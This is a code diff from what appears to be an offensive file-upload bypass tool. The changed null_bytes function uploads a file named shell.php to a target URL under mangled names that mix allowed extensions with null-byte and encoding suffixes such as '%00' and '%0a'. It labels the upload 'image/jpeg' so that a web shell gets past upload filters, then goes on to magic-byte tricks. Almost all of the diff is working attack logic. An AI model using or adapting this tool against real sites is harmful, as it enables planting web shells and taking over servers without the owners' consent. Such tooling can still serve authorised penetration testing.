@@ -560,14 +560,50 @@ def null_bytes(EXTENSION, URL, ALLOWED_EXT, counter, SUCCESS, proxies, TLS, head
     null = ["%20", "%0a", "%00", "%0d%0a", "/", ".\\", ".", "...."]
 
     print(termcolor.colored(f"[-] Trying null bytes at the end of the {EXTENSION} extensions technique!", 'magenta'))
+    
+    temp_extension = ALLOWED_EXT
 
-    for ext in eval(EXTENSION):
+    if "," in temp_extension:
+
+        valid_extensions = temp_extension.split(",")
+        
+        for val_ext in valid_extensions:
+            
+            for ext in eval(EXTENSION):
+
+                for byte in null:
+
+                    counter += 1
+                    filename = 'shell.php'
+                    filename_ext = filename.replace("shell.php", f"shell{val_ext}{byte}{ext}")
+                    files = {
+                        f'{file_attr}': (filename_ext, open(filename, 'rb'), 'image/jpeg'),
+                        'submit': (None, 'Upload Image')
+                    }
+
+                    response = session.post(URL, files=files, allow_redirects=False, headers=headers, data=data,
+                                            proxies=proxies, verify=TLS)
+
+                    if verbosity:
+                        print(response.text)
+
+                    brute = success(SUCCESS, response, URL, filename_ext, counter, brute_force, location, session, headers,
+                                    proxies, TLS)
+
+                    if brute:
+                        break
+                        
+            magic_bytes(EXTENSION, val_ext, URL, counter, SUCCESS, proxies, TLS, headers, brute_force, verbosity,location, session, file_attr, data)
+        
+    else:
+        
+      for ext in eval(EXTENSION):
 
         for byte in null:
 
             counter += 1
             filename = 'shell.php'
-            filename_ext = filename.replace("shell.php", f"shell{ext}{byte}")
+            filename_ext = filename.replace("shell.php", f"shell{temp_extension}{byte}{ext}")
             files = {
                 f'{file_attr}': (filename_ext, open(filename, 'rb'), 'image/jpeg'),
                 'submit': (None, 'Upload Image')
@@ -584,23 +620,12 @@ def null_bytes(EXTENSION, URL, ALLOWED_EXT, counter, SUCCESS, proxies, TLS, head
 
             if brute:
                 break
+                
+      valid = "".join(temp_extension)
 
-    temp_extension = ALLOWED_EXT
-
-    if "," in temp_extension:
-
-        valid_extensions = temp_extension.split(",")
-
-        for valid in valid_extensions:
-            magic_bytes(EXTENSION, valid, URL, counter, SUCCESS, proxies, TLS, headers, brute_force, verbosity,
-                        location, session, file_attr, data)
-
-    else:
-        valid = "".join(temp_extension)
-
-        magic_bytes(EXTENSION, valid, URL, counter, SUCCESS, proxies, TLS, headers, brute_force, verbosity, location,
-                    session, file_attr, data)
-
+      magic_bytes(EXTENSION, valid, URL, counter, SUCCESS, proxies, TLS, headers, brute_force, verbosity, location,
+                    session, file_attr, data)    
+        
 
 def magic_bytes(EXTENSION, valid, URL, counter, SUCCESS, proxies, TLS, headers, brute_force, verbosity, location,
                 session, file_attr, data):
